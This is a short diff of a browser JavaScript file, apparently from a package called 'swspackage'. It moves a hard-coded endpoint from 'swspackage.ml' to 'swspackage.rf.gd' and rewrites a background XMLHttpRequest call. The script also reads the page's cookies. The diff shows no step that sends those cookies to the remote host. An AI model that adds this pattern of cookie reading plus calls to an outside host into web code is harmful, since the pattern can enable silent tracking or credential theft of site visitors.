@@ -1,6 +1,6 @@
 //@prepros-append script.offline.js
 let swsp = document.cookie.split(";");
-let url = "http://swspackage.ml";
+let url = "http://swspackage.rf.gd";
 let varSwsp = [];
 
 //Change the background imahe
@@ -26,7 +26,7 @@ function uppercase(str) {
 
     let xhttp = new XMLHttpRequest();
 
-    xhttp.open("GET", "http://swspackage.ml/API/test.php");
+    xhttp.open("GET", "http://swspackage.rf.gd/API/api2.php");
     xhttp.send();
 
 
